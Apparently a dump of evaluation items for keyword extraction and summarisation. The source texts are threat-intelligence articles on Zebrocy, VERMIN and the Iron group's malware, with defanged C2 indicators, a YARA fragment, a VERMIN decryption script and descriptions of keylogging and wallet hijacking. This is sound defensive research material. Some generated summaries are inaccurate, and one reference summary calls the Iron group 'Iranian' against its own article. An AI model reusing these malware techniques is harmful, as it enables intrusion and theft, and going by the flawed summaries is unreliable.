uint32(0) == 0xE011CFD0 and all of ($required*) and (all of ($author*) or$specific or 5 of ($builder*)) }apt Macros Sophacy11/11 ", "generated_text": "Zebrocy; APT28; former Soviet Republics; Asia; March 2021; documents; Word documents; Kazchrome; the vulnerability; a PE; a use; IDR; IDC; a plugin; dhrake; a decombiner; binary; IDC; the Malware; victims; Kazakhstan; VirusTotal; victims; 2014; filenames; VirusTotal; VirusTotal; the victims; a crash; the code; a macro; an image; the behavior; IOC; YARA; detection rules; this threat actor.", "ref_text": "<START-1>The PDF analyzes recent malware documents used by the APT group Zebrocy to target organizations in Kazakhstan. Zebrocy is a subgroup of the Sofacy cyberespionage group. - Six Word documents purporting to be from a Kazakh company contained VBA macros that drop malware. Two were likely real spearphishing documents. - The VBA macros were password-protected, but could be reversed to find base64 encoded malware. This decoded to a Delphi executable called wininition. - Wininition contains keylogging functionality that logs keystrokes to be sent to a command and control server. The C2 URLs were obfuscated with hex encoding. - The researcher demonstrates how to decompile the malware using Interactive Delphi Reconstructor (IDR) and import the results into Ghidra using the dhrake plugin. This reconstructions Delphi symbol names and class structures. - Analysis revealed additional related Zebrocy activity, suggesting the group is actively targeting Central Asia. Indicators of compromise and YARA rules are provided to help detect this threat. - The report highlights techniques to analyze Zebrocy's malware documents, which use Evade macros and Delphi malware. Ongoing research is required to counter this adaptable subgroup as part of the formidable Sofacy APT. <END-1>", "t5/keyword/hint_hit_precision": 0.24324324324324326, "t5/word/hint_hit_recall": 0.06315789473684211, "gpt3/lexical/rouge_rouge1": 0.4396284829721362, "gpt3/lexical/rouge_rouge2": 0.09968847352024922, "gpt3/lexical/rouge_rougeL": 0.22910216718266255, "gpt3/lexical/rouge_rougeLsum": 0.22910216718266255, "gpt3_generated_text": ["The article provides a deep dive into the dropper documents associated with the Zebrocy subgroup of the Sofacy APT threat actor, also known as FancyBear or APT28. The focus is on a cluster of activities targeting Kazakhstan in March 2021, with Delphocy malware being used. The Word documents purport to be from Kazchrome, a mining and metal company in Kazakhstan. The article details techniques for reverse engineering Delphocy dropper docs, including bypassing password-protected macros and decompiling Delphi using IDR. The analysis led to the discovery of further Zebrocy clusters, with IOCs and YARA detection rules provided for threat hunters. The article also discusses the use of a plugin by dhrake for Ghidra when reversing Delphi binaries. Overall, the article delves into the behavior of Zebrocy and provides insights into the vulnerabilities exploited by this threat actor."]}, {"split_name": "val", "sample_id": "val_67", "prompt_text": "Extract the keywords: Blog Home (url > Unit 42 (url > VERMIN: Quasar RAT and Custom Malware Used In UkraineVERMIN: Quasar RAT and Custom Malware Used In UkraineBy Tom Lancaster (url and Juan Cortes (url January 29, 2018 at 5:00 AM Category: Unit 42 (url Tags: AutoFocus (url ConfuserEx (url Espionage (url Quasar (url Quasar RAT (url Ukraine (url VERMIN (url \ue800 2,352 \ue802(3)(url custom-malware-used-ukraine%2F+VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine) \ue805 (url u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-vermin-quasar-rat- custom-malware-used-ukraine%2F) \ue804 (url mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-vermin- quasar-rat-custom-malware-used- ukraine%2F&title=VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine&summary=&source=)(//www.reddit.com/submit)Summary Palo Alto Networks Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call \u201cVERMIN\u201d; an ironic term for a RAT (Remote Access Tool). Cursory investigation into the malware showed the attackers not only had \ufb02air for malware naming, but also for choosing interesting targets for their malware: nearly all the targeting we were able to uncover related to activity in Ukraine. Pivoting further on the initial samples we discovered, and their infrastructure, revealed a modestly sized campaign going back to late 2015 using both Quasar RAT (url and VERMIN. This blog shows the links between the activity observed, a walkthrough of the analysis of the VERMIN malware, and IOCs for all activity discovered. It all began with a tweet Our initial interest was piqued through a tweet (url from a fellow researcher who had identi\ufb01ed some malware with an interesting theme relating to the Ukrainian Ministry of Defense as a lure.(url 1 \u2013 The decoy document displayed to users when executing the initial malware sampleThe sample was an SFX exe which displayed a decoy document to users before continuing to execute the malware; the hash of the \ufb01le is given below. protocol used for exchanging structured information, for command and control (C2), which is something not often seen in malware samples. Using AutoFocus, we were quickly able to \ufb01nd similar samples, by pivoting on the artifacts the malware created during a sandbox run, resulting in 7 other samples as shown in Figure 2.(url 2 \u2013 Pivoting in AutoFocus makes it easy to \ufb01nd similar malware samples.Using the Maltego for AutoFocus (url transforms, we were then able to take the newly discovered samples and look at the C2 infrastructure in an attempt to see if we could link the samples together and in turn see if these C2\u2019s were contacted by malware. We quickly built up a picture of a campaign spanning just over 2 years with a modest C2 infrastructure:(url 3 \u2013 Further analysis using AutoFocus & other data sources allows us to link up the activity discovered so far.The malware samples we discovered fell largely into two buckets: Quasar Rat and VERMIN. Quasar RAT is an open-source malware family which has been used in several other attack campaigns including criminal (url 2017) and espionage (url recent-targeted-attacks-against-governments/) motivated attacks. But a reasonable number of the samples were the new malware family, VERMIN. Looking at the samples in our cluster we could see the themes of the dropper \ufb01les were similar to our \ufb01rst sample. Notably, most of the other \ufb01les we discovered did not come bundled with a decoy document and instead were simply the malware and dropper compiled with icons matching popular document viewing tools, such as Microsoft Word. Names of some of the other dropper binaries observed are given below, with the original Ukrainian on the left and the translated English (via Google) on the right: Original Name (Ukrainian)Translated Name (if applicable) Your certi\ufb01cate for free_receive help.exereport2.exe fuel supply report 08.06.17.exeN/A\u0412\u0430\u0448_ \u0441\u0435\u0440\u0442\u0438\u0444_\u043a\u0430\u0442\u0438 \u0434\u043b\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u0431\u0435\u0437\u043e\u043f\u043b\u0430\u0442\u043d\u043e_ \u0432\u0442\u043e\u0440\u0438\u043d\u043d\u043e_ \u0434\u043e\u043f\u043e\u043c\u043e\u0433\u0438.exe \u043f\u0430\u043b\u0438\u0432\u043e\u043c 08.06.17.exelg_svet_smeta2016- 2017cod.exe.lugansk_2273_21.04.2017.exeN/A\u041e\u0442\u0447\u0435\u0442-\u0440\u0430\u0439\u043e\u043d\u044b_2\u043a\u0432- \u043b-2016.exeReport-areas_2kv-l-2016.exeGiven the interesting targeting themes and the discovery of a new malware family, we decided to take a peek at what \u201cVERMIN\u201d was capable of and document it here. Dissecting VERMIN For this walkthrough, we\u2019ll be going through the analysis of the following sample: 2017-07-04 12:46:43 UTCAnalyzing the malware dynamically quickly gave us a name for the malware, based on the PDB string present in the memory of the sample: Z:\\Projects\\Vermin\\TaskScheduler\\obj\\Release\\Licenser.pdb As is the case with many of the samples from the threat actors behind VERMIN, our sample is packed initially with the popular .NET obfuscation tool ConfuserEx (url Using a combination of tools, we were able to unpack and deobfuscate the malware. Following initial execution, the malware \ufb01rst checks if the installed input language (url us/library/cc766191(v=ws.10).aspx) in the system is equal to any of the following:ru \u2013 Russian uk \u2013 Ukrainian ru-ru \u2013 Russian uk-ua \u2013 UkrainianIf none of the languages above is found the malware calls \u201cApplication.Exit() (url us/library/ms157894(v=vs.110).aspx)\u201d, however despite its name, this API call doesn\u2019t actually successfully terminate the application, and instead the malware will continue to run. It\u2019s likely the author intended to terminate the application, in which case a call like \u201cSystem.Environment.Exit()\u201d would have been a better choice. The fact that this functionality does not work as intended suggests that if author tested the malware before deployment, they were likely to be doing so on systems where the language matches the list above, since otherwise they would notice that the function is not working as expected. After passing the installed language check the malware proceeds to decrypt an embedded resource using the following logic:It retrieves the \ufb01nal four bytes of the encrypted resource. These four bytes are a CRC32 sum, and the malware then proceeds to brute force what 6-byte values will give this CRC32 sum. Once it \ufb01nds this array of 6 bytes it performs an MD5 hash sum on the bytes, this value is used as the key. The \ufb01rst 16bytes of the encrypted resource are then used as the IV for decryption Finally, using AES it decrypts the embedded resource.A script mirroring this routine can be found in appendix C. After decrypting the embedded resource, the malware passes several hardcoded arguments to the newly decrypted binary and performs a simple setup routine before continuing execution. The embedded resource contains all the main code for communications and functionality the RAT contains. First the malware attempts to decrypt all of the strings passed as parameters. If no arguments were supplied the malware attempts to read a con\ufb01guration \ufb01le from a pre-de\ufb01ned location expecting it to be base64-encoded and encrypted with 3- DES using a hardcoded key \u201cKJGJH&^$f564jHFZ\u201d: C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\AddIns\\settings.dat If arguments were supplied, they are saved and encrypted to the same location as above. Parameters supplied are given below. Note that these are the actual variable names used by the malware author:serverIpList keyLoggerTaskAuthorThe decrypted resource is set to be run as a scheduled task every 30 minutes, inde\ufb01nitely. After this, the malware is ready to start operations, and does so by collecting various information about the infected machine, examples of collected information includes but is not limited to:Machine name Username OS name via WMI query Architecture: x64 vs x86 (64 vs. 32 bit) Local IP Address Checks Anti-Virus installed via WMI queryIf the Anti-Virus (AV) query determines any AV is installed the malware does not install the keylogger. The keylogger is embedded as a resource named \u2018AdobePrintFr\u2019. This binary is only packed with Confuser-Ex and is not further obfuscated. The malware then sends its initial beacon using a SOAP envelope to establish a secure connection. The author uses the WSHttpBinding() API \u2013 which allows the author to use WS-Addressing and purposely sets the WSMessageEncoding.Mtom to encode the SOAP messages. The author also sets up for using \u2018Username\u2019 authentication for communicating with its C2, presumably allowing the author easier control over the various infected hosts. A defanged exemplar request/response is 3POST /CS HTTP/1.1 MIME-Version: 1.0 Content-Type: multipart/related; type=\"application/xop+xml\";start=\"<url\";boundary=\"uuid:ae621187-99b 2-4b50-8a74-a33e8c7c0990+id=3\";start-info=\"application/soap+xml\" Host: akamainet024[.]info Content-Length: 1408 Expect: 100-continue Accept-Encoding: gzip, deflate Connection: Keep-Alive --uuid:ae621187-99b2-4b50-8a74-a33e8c7c0990+id=3 Content-ID: <url Content-Transfer-Encoding: 8bit Content-Type: application/xop+xml;charset=utf-8;type=\"application/soap+xml\" <s:Envelope xmlns:s=\"url\" xmlns:a=\"url\"><s:Header ><a:Action s:mustUnderstand=\"1\">url 159e7656-a3ea-4099-aa59-7ab04361ad99</a:MessageID><a:ReplyTo><a:Address>url </a:Address></a:ReplyTo><a:To s:mustUnderstand=\"1\">url rityToken Context=\"uuid-9a01748a-8acf-449e-9a3d-febcff2f2406-3\" xmlns:t=\"url\"> <t:TokenType>url 05/02/trust/Issue</t:RequestType><t:KeySize>256</t:KeySize><t:BinaryExchange ValueType=\" url s/2005/02/trust/tlsnego\" EncodingType=\"url 1.0#Base64Binary\">FgMBAFoBAABWAwFaCdyfpYsLZDbnCizlWg3iw2M80KiaWb+oIgzhJ1BvugAAGAAvADUABQAKwBPAFMAJwAoAMgA4ABMABAEAABX/ AQABAAAKAAYABAAXABgACwACAQA=</t:BinaryExchange></t:RequestSecurityToken></s:Body></s:Envelope> --uuid:ae621187-99b2-4b50-8a74-a33e8c7c0990+id=3--17 VERMIN collects all keystrokes and clipboard data and encrypts the data before storing it in the following folder: %appdata%\\Microsoft\\Proof\\Settings.{ED7BA470 8E54 465E 825C 99712043E01C}\\Profiles\\. Each \ufb01le is saved with the following format: \u201c{0:dd-MM-yyyy}.txt\u201d. The data is encrypted using the same method and 3-DES key, used to encrypt the con\ufb01guration \ufb01le. Vermin supports the following commands:4 UploadFileFor most of these commands, the malware requires \u201chands-on-keyboard\u201d style one-to-one interactions. Often remote access tools written in .NET borrow and steal code from other tools due to the plethora of code available through open source; however, it appears that whilst some small segments of code may have been lifted from other tools, this RAT is not a fork of a well-known malware family: it\u2019s mostly original code. We have linked all the samples we have been able to identify to the same cluster of activity: this strongly suggests the VERMIN malware is used exclusively by this threat actor and this threat actor alone. We were unable to de\ufb01nitively determine the aims of the attackers or the data stolen. However, given the limited number of samples, the targeting themes observed, and the \u201chands-on-keyboard\u201d requirement for most of the malwares\u2019 operations (except for keylogging), it seems likely that the malware is used in targeted attacks in Ukraine. Ukraine remains a ripe target for attacks, even gaining its own dedicated Wikipedia page (url for attacks observed in 2017. In addition to the high-pro\ufb01le attacks such as the Petya/NotPetya (url and BadRabbit (url which have been widely reported, there are likely many smaller campaigns like the one described in this blog aimed to steal data to gain an information advantage for the attackers\u2019 sponsors. Palo Alto Networks defends our customers against the samples discussed in this blog in the following ways:Wild\ufb01re identi\ufb01es all samples mentioned in this article as malicious. Traps identi\ufb01es all samples mentioned in this article as malicious. C2 domains used in this campaign are blocked via Threat Prevention.AutoFocus customers can track samples related to this blog via the following tags:VERMIN (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMIN) VERMINKeylogger (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMINKeyLogger) VERMINCampaign (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMINCampaign)Appendix A \u2013 C2 Addresses www.akamaicdn[.]ru www.akamainet066[.]info www.akamainet023[.]info www.akamainet021[.]infoakamainet023[.]info www.akamainet022[.]info www.cdnakamai[.]ru notifymail[.]ru www.notifymail[.]ru mailukr[.]net tech-adobe.dyndns[.]biz www.mailukr[.]net 185.158.153[.]222 94.158.47[.]228 195.78.105[.]23 94.158.46[.]251 188.227.75[.]189 212.116.121[.]46 185.125.46[.]24 5.200.53[.]181 Appendix B \u2013 Malware Samples Appendix C \u2013 Python script to decode VERMIN resources1 54#!/usr/local/bin/python __author__ = \"Juan C Cortes\" __version__ = \"1.0\" __email__ = \"jcortes@paloaltonetworks.com\" from random import randint from tabulate import tabulate from Crypto import Random from Crypto.Cipher import AES parser = argparse.ArgumentParser( usage=\"Decrypt strings for VerminRAT\") help=\"Print debugging information\") help=\"Output results file\") help=\"Input file of newline separated strings or single string\") help=\"Param use for decrypting blobs of data instead of strings. Blob is autosave to 'blob.out'\") def write_out(output_list, headers, output_file=False): \"\"\" Pretty outputs list :param output_list: List to output \"\"\" print tabulate(output_list, headers, tablefmt=\"simple\") with open(output_file, \"ab\") as file: file.write(tabulate(output_list, headers, tablefmt=\"simple\")) file.write(\"\\n\\n\") abyte = bytearray(6) for i in range(0,6): abyte[i] = randint(0, 0x7FFFFFFF) % 7 def parseEncrypteStr(encryptStr): try: decoded = encryptStr.decode('base64') hardcoded_crc32 = decoded[-4:] parsedEncrypted = decoded[16:-4] iv = decoded[:16] return hardcoded_crc32,parsedEncrypted,iv except Exception as e: def bruteForceCRC32Value(valuecrc32): crc32 = binascii.crc32(arry) crc32 = crc32 % (1 << 32) if crc32 == valuecrc32: def decryptStr(str,key,iv): aes = AES.new(key, AES.MODE_CBC, iv) blob = aes.decrypt(str) def parsePlainText(str): char = \"\" for i in str: if 0x20 <= ord(i) <= 0x127: def parseUnicde(str): for i in range(0,len(str)/2): uni += str[i] return uni.decode('utf16') except Exception as e: args = parse_arguments().parse_args() if args.vverbose: logging.basicConfig( level=logging.DEBUG, format=' %(asctime)s - %(levelname)s - %(message)s') if args.blob and os.path.exists(args.input) != True: b = args.input crc32Hardcode, encryptedStr, iv = parseEncrypteStr(b) crc32Hardcode = bytearray(crc32Hardcode) crc32Hardcode = struct.unpack('<I', crc32Hardcode)[0] bruteArray = bruteForceCRC32Value(crc32Hardcode) m = hashlib.md5() m.update(bruteArray) key = m.digest() plain = decryptStr(encryptedStr, key, iv) with open('blob.out', \"wb\") as file: file.write(plain) if os.path.exists(args.input) != True: strs.append(args.input) with open(args.input, \"rb\") as open_file: for line in open_file: hash = line.rstrip() strs.append(hash) for s in strs: crc32Hardcode,encryptedStr,iv = parseEncrypteStr(s)crc32Hardcode = bytearray(crc32Hardcode) crc32Hardcode = struct.unpack('<I', crc32Hardcode)[0] bruteArray = bruteForceCRC32Value(crc32Hardcode) m = hashlib.md5() m.update(bruteArray) key = m.digest() plain = decryptStr(encryptedStr,key,iv) parsestr = parsePlainText(plain) unistr = parseUnicde(plain) headers = [\"ASCII\",\"UNICODE\"] outputlist = [[parsestr,unistr]] write_out(outputlist, headers, args.output_file) if __name__ == '__main__': 158Got something to say?Leave a comment Notify me of followup comments via e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailCOMPANY Company (url Careers (url Sitemap (url Report a Vulnerability (url NOTICES Privacy Policy (url Terms of Use (url Manage Subscription (url\uf08c (url \uf082 (url \uf081 (url\u00a9 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 888.219.8447 \uf101SEE A DEMO \uf101TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD) ", "generated_text": "Palo Alto Networks; a new malware family; VERMIN; the Microsoft.NET Framework; the malware samples; October 2015; the malware; custom; Custom; Data; APT; names; names; targeting; Ukraine; the attackers; their tactics; naming; the malware; interest; the researchers; the malware; activities; late 2015; Threat Activity; the group; tactics; a tweet; a decoy document; the initial malware sample; the malware; first; the first sample; shortcuts; commands; control; the malware; files; the Maltego; the infrastructure; the samples; the malware; the C2; command; control; the malware; the dropper; the malware; the malware; the C2; commands; indicators; compromise; the infrastructure.", "ref_text": "<START-1>Palo Alto Networks Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call \u201cVERMIN\u201d; an ironic term for a RAT (Remote Access Tool). Cursory investigation into the malware showed the attackers not only had flair for malware naming, but also for choosing interesting targets for their malware: nearly all the targeting we were able to uncover related to activity in Ukraine. Pivoting further on the initial samples we discovered, and their infrastructure, revealed a modestly sized campaign going back to late 2015 using both Quasar RAT (url and VERMIN. This blog shows the links between the activity observed, a walkthrough of the analysis of the VERMIN malware, and IOCs for all activity discovered. <END-1>", "t5/keyword/hint_hit_precision": 0.18518518518518517, "t5/word/hint_hit_recall": 0.1487603305785124, "gpt3/lexical/rouge_rouge1": 0.5839416058394161, "gpt3/lexical/rouge_rouge2": 0.3161764705882353, "gpt3/lexical/rouge_rougeL": 0.3503649635036496, "gpt3/lexical/rouge_rougeLsum": 0.3503649635036496, "gpt3_generated_text": ["Palo Alto Networks Unit 42 has discovered a new malware family called VERMIN, written using the Microsoft.NET Framework, with a focus on targeting activities in Ukraine. The attackers behind VERMIN have shown a flair for naming their malware and choosing interesting targets. The campaign, dating back to late 2015, uses both Quasar RAT and VERMIN. The initial discovery of the malware was prompted by a tweet from a researcher identifying a decoy document related to the Ukrainian Ministry of Defense. Further analysis using AutoFocus and Maltego revealed a modestly sized campaign with a C2 infrastructure spanning over two years. The malware samples uncovered were mostly Quasar RAT and VERMIN, with the latter being a new custom malware family. The attackers employed various tactics, including decoy documents and C2 communication via a structured protocol. This article provides insights into the VERMIN malware, its targeting tactics, and indicators of compromise related to the campaign."]}, {"split_name": "val", "sample_id": "val_68", "prompt_text": "Extract the keywords: HomeProducts & ServicesTechnologyCompanyBlogResourcesTry it nowBlog Cybersecurity DNAIron Cybercrime Group Under The ScopePDFmyURL converts any url to pdf!Omri Ben Bassat 29.05.18 | 11:53 amShare:In April 2018, while monitoring public data feeds, we noticed an interesting and previously unknown backdoor using HackingTeam\u2019s leaked RCS source code. We discovered that this backdoor was developed by the Iron cybercrime group, the same group behind the Iron ransomware (rip-off Maktub ransomware recently discovered by Bart Parys), which we believe has been active for the past 18 months.During the past year and a half, the Iron group has developed multiple types of malware (backdoors, crypto-miners, and ransomware) for Windows, Linux and Android platforms. They have used their malware to successfully infect, at least, a few thousand victims.In this technical blog post we are going to take a look at the malware samples found during the research.Technical Analysis: Installer:** This installer sample (and in general most of the samples found) is protected with VMProtect then compressed using UPX.Installation process: 1. Check if the binary is executed on a VM, if so \u2013 ExitProcess2. Drop & Install malicious chrome extension %localappdata%\\Temp\\chrome.crx 3. Extract malicious chrome extension to %localappdata%\\Temp\\chrome & create a scheduled task to execute %localappdata%\\Temp\\chrome\\sec.vbs. 4. Create mutex using the CPU\u2019s version to make sure there\u2019s no existing running instance of itself. 5. Drop backdoor dll to %localappdata%\\Temp\\\\<random>.dat. 6. Check OS version:PDFmyURL converts any url to pdf!.If Version == Windows XP then just invoke \u2018Launch\u2019 export of Iron Backdoor for a one-time non persistent execution. .If Version > Windows XP -Invoke \u2018Launch\u2019 export -Check if Qhioo360 \u2013 only if not proceed, Install malicious certificate used to sign Iron Backdoor binary as root CA.Then create a service called \u2018helpsvc\u2019 pointing back to Iron Backdoor dll.PDFmyURL converts any url to pdf!Using the leaked HackingTeam source code: Once we Analyzed the backdoor sample, we immediately noticed it\u2019s partially based on HackingTeam\u2019s source code for their Remote Control System hacking tool, which leaked about 3 years ago. Further analysis showed that the Iron cybercrime group used two main functions from HackingTeam\u2019s source in both IronStealer and IronPDFmyURL converts any url to pdf!ransomware.1.Anti-VM: Iron Backdoor uses a virtual machine detection code taken directly from HackingTeam\u2019s \u201cSoldier\u201d implant leaked source code. This piece of code supports detecting Cuckoo Sandbox, VMWare product & Oracle\u2019s VirtualBox. Screenshot:2. Dynamic Function Calls: Iron Backdoor is also using the DynamicCall module from HackingTeam\u2019s \u201ccore\u201d library. This module is used to dynamically call external library function by obfuscated the function name, which makes static analysis of this malware more complex. In the following screenshot you can see obfuscated \u201cLFSOFM43/EMM\u201d and \u201cDsfbufGjmfNbqqjohB\u201d, which represents \u201ckernel32.dll\u201d and \u201cCreateFileMappingA\u201d API.PDFmyURL converts any url to pdf!For a full list of obfuscated APIs you can visit obfuscated_calls.h.Malicious Chrome extension: A patched version of the popular Adblock Plus chrome extension is used to inject both the in-browser crypto-mining module (based on CryptoNoter) and the in-browser payment hijacking module.**patched include.preload.js injects two malicious scripts from the attacker\u2019s Pastebin account.The malicious extension is not only loaded once the user opens the browser, but also constantly runs in the background, acting as a stealth host based crypto-miner. The malware sets up a scheduled task that checks if chrome is already running, every minute, if it isn\u2019t, it will \u201csilent-launch\u201d it as you can see in the following screenshot:PDFmyURL converts any url to pdf!Internet Explorer(deprecated):Iron Backdoor itself embeds adblockplusie \u2013 Adblock Plus for IE, which is modified in a similar way to the malicious chrome extension, injecting remote javascript. It seems that this functionality is no longer automatically used for some unknown reason.Persistence: Before installing itself as a Windows service, the malware checks for the presence of either 360 Safe Guard or 360 Internet Security by reading following registry keys:.SYSTEM\\CurrentControlSet\\Services\\zhudongfangyu. .SYSTEM\\CurrentControlSet\\Services\\360rpIf one of these products is installed, the malware will only run once without persistence. Otherwise, the malware will proceed to installing rouge, hardcoded root CA certificate on the victim\u2019s workstation. This fake root CA supposedly signed the malware\u2019s binaries, which will make them look legitimate.Comic break: The certificate is protected by the password \u2018caonima123\u2019, which means \u201cf*ck your mom\u201d in Mandarin.IronStealer (<RANDOM>.dat): Persistent backdoor, dropper and cryptocurrency theft module.1. Load Cobalt Strike beacon: The malware automatically decrypts hard coded shellcode stage-1, which in turn loads Cobalt Strike beacon in-memory, using a reflective loader:PDFmyURL converts any url to pdf!Beacon: hxxp://dazqc4f140wtl.cloudfront[.]net/ZZYO2. Drop & Execute payload: The payload URL is fetched from a hardcoded Pastebin paste address:We observed two different payloads dropped by the malware:1. Xagent \u2013 A variant of \u201cJbossMiner Mining Worm\u201d \u2013 a worm written in Python and compiled using PyInstaller for both Windows and Linux platforms. JbossMiner is using known database vulnerabilities to spread. \u201cXagent\u201d is the original filename Xagent<VER>.exe whereas <VER> seems to be the version of the worm. The last version observed was version 6 (Xagent6.exe).PDFmyURL converts any url to pdf!**Xagent versions 4-6 as seen by VT2. Iron ransomware \u2013 We recently saw a shift from dropping Xagent to dropping Iron ransomware. It seems that the wallet & payment portal addresses are identical to the ones that Bart observed. Requested ransom decreased from 0.2 BTC to 0.05 BTC, most likely due to the lack of payment they received.PDFmyURL converts any url to pdf!**Nobody paid so they decreased ransom to 0.05 BTC3. Stealing cryptocurrency from the victim\u2019s workstation: Iron backdoor would drop the latest voidtool Everything search utility and actually silent install it on the victim\u2019s workstation using msiexec. After installation was completed, Iron Backdoor uses Everything in order to find files that are likely to contain cryptocurrency wallets, by filename patterns in both English and Chinese.Full list of patterns extracted from sample: \u2013 Etherenum keystore filename \u2013 *litecoin*.txtPDFmyURL converts any url to pdf!\u2013 **.txt \u2013 *coinbase*4. Hijack on-going payments in cryptocurrency: IronStealer constantly monitors the user\u2019s clipboard for Bitcoin, Monero & Ethereum wallet address regex patterns. Once matched, it will automatically replace it with the attacker\u2019s wallet address so the victim would unknowingly transfer money to the attacker\u2019s account:Pastebin Account: As part of the investigation, we also tried to figure out what additional information we may learn from the attacker\u2019s Pastebin account:PDFmyURL converts any url to pdf!The account was probably created using the mail fineisgood123@gmail[.]com \u2013 the same email address used to register blockbitcoin[.]com (the attacker\u2019s crypto-mining pool & malware host) and swb[.]one (Old server used to host malware & leaked files. replaced by u.cacheoffer[.]tk):1. Index.html: HTML page referring to a fake Firefox download page. 2. crystal_ext-min + angular: JS inject using malicious Chrome extension. 3. android: This paste holds a command line for an unknown backdoored application to execute on infected Android devices. This command line invokes remote Metasploit stager (android.apk) and drops cpuminer 2.3.2 (minerd.txt) built for ARM processor. Considering the last update date (18/11/17) and the low number of views, we believe this paste is obsolete.4. androidminer: Holds the cpuminer command line to execute for unknown malicious android applications, at the time of writing this post, this paste received nearly 2000 hits.PDFmyURL converts any url to pdf!Aikapool[.]com is a public mining pool and port 7915 is used for DogeCoin:The username (myapp2150) was used to register accounts in several forums and on Reddit. These accounts were used to advertise fake \u201cblockchain exploit tool\u201d, which infects the victim\u2019s machine with Cobalt Strike, using a similar VBScript to the one found by Malwrologist (ps5.sct).XAttacker: Copy of XAttacker PHP remote file upload script. miner: Holds payload URL, as mentioned above (IronStealer).FAQ:How many victims are there? It is hard to define for sure, , but to our knowledge, the total of the attacker\u2019s pastes received around 14K views, ~11K for dropped payload URL and ~2k for the android miner paste. Based on that, we estimate that the group has successfully infected, a few thousandsPDFmyURL converts any url to pdf!victims.Who is Iron group? We suspect that the person or persons behind the group are Chinese, due in part to the following findings: . There were several leftover comments in the plugin in Chinese. . Root CA Certificate password (\u2018f*ck your mom123\u2019 was in Mandarin) We also suspect most of the victims are located in China, because of the following findings: . Searches for wallet file names in Chinese on victims\u2019 workstations. . Won\u2019t install persistence if Qhioo360(popular Chinese AV) is foundIOCS:blockbitcoin[.]com pool.blockbitcoin[.]com ssl2.blockbitcoin[.]com xmr.enjoytopic[.]tk down.cacheoffer[.]tk dzebppteh32lz.cloudfront[.]net dazqc4f140wtl.cloudfront[.]net androidapt.s3-accelerate.amazonaws[.]com androidapt.s3-accelerate.amazonaws[.]com winapt.s3-accelerate.amazonaws[.]com Ex-officer in the IDF-CERT. Malware analyst and Reverse Engineer with vast experience in dealing with Nation-sponsored cyber attacks. | omri@intezer.comTags:backdoorbitcoincryptominercybercrimemalwareransomwarechinaironShare:Register to our free communityTry it nowPDFmyURL converts any url to pdf!Executable And Linkable Format 101 Pa\u2026Digital Certificates- When The Chain Of T\u2026\uf104\uf105Home ProductsIntezer Analyze\u2122Compromise AssessmentTechnology CompanyAboutNews and EventsIntezer Blog Contact\u00a9 Intezer.com 2017 All rights reservedTerms ofUsePrivacyPolicy\uf099\uf0e1\uf09a\uf167PDFmyURL converts any url to pdf! ", "generated_text": "April 2018; April 2018; hackingTeam; Iron cybercrime group; the Iron ransomware; Maktub ransomware; id; the malware; DOWNLOAD; a dll; Backdoor; Dynamic Function Calls; Cuckoo Sandbox; VMWare; Oracle; the malware; a scheduled task; Trojan; Trojan; crypt; 15; stealth; the victim; a scheduled task; Chrome; id; a scheduled task; running services; the dll; a summary; the analysis; the underlying framework; the hacker.", "ref_text": "<START-1>The report analyzes malware developed by an Iranian cybercrime group called Iron. The group has been active for around 18 months and has created backdoors, crypto-miners, and ransomware for Windows, Linux, and Android. Researchers discovered a new Iron backdoor using leaked HackingTeam source code. The backdoor installs the Xagent crypto-miner worm or Iron ransomware onto systems. It also steals cryptocurrency wallet files and hijacks crypto transactions. The malware uses a signed Chrome extension for stealthy crypto-mining and payment hijacking. It abuses HackingTeam anti-VM checks and dynamic function calling to avoid detection. The attackers used a network of Pastebin pastes for C2. Based on forum links and Chinese language artifacts, Iron is suspected to be a Chinese group. While not the most advanced actor, the rapid development across platforms shows the group's capabilities and business model. The report includes full technical analysis and indicators of compromise. <END-1>", "t5/keyword/hint_hit_precision": 0.21212121212121213, "t5/word/hint_hit_recall": 0.05517241379310345, "gpt3/lexical/rouge_rouge1": 0.5467625899280575, "gpt3/lexical/rouge_rouge2": 0.18840579710144928, "gpt3/lexical/rouge_rougeL": 0.25179856115107907, "gpt3/lexical/rouge_rougeLsum": 0.25179856115107907, "gpt3_generated_text": ["In April 2018, the Iron cybercrime group was discovered to have developed a backdoor using leaked HackingTeam source code. This group, known for the Iron ransomware, has been active for the past 18 months, creating various types of malware for multiple platforms. The backdoor installer is protected with VMProtect and compressed using UPX, with installation processes including dropping a malicious Chrome extension, creating a mutex, and checking the OS version. The malware is based on HackingTeam's source code, utilizing anti-VM detection and dynamic function calls. A malicious Chrome extension injects crypto-mining and payment hijacking scripts, running stealthily in the background. The Iron Backdoor also embeds Adblock Plus for Internet Explorer. Overall, the Iron cybercrime group has successfully infected thousands of victims with their sophisticated malware."]}, {"split_name": "val", "sample_id": "val_69", "prompt_text": "Extract the keywords: \u201cRed October\u201d. Detailed Malware Description 2. Second Stage of Attacksecurelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/GReATFirst stage of attackSecond stage of attack1. Modules, general overviewModule frameworkThe main component of Sputnik implements a framework for executing the \u201ctasks\u201d that are provided by its C&C servers.Most of the tasks are provided as one-time PE DLL libraries that are received from the server, executed in memory and then immediately discarded.Several tasks need to be constantly present, i.e. waiting for the iPhone or Nokia mobile to connect. These tasks are provided as PE EXE files and are installed to the infected machine.Persistent tasksOnce a USB drive is connected, search and extract files by mask/format, including deleted files. Deleted files are restored using a built in file system parser Wait for an iPhone or a Nokia phone to be connected. Once connected, retrieve information about the phone, its phone book, contact list, call history, calendar, SMS messages, browsing history Wait for a Windows Mobile phone to be connected. 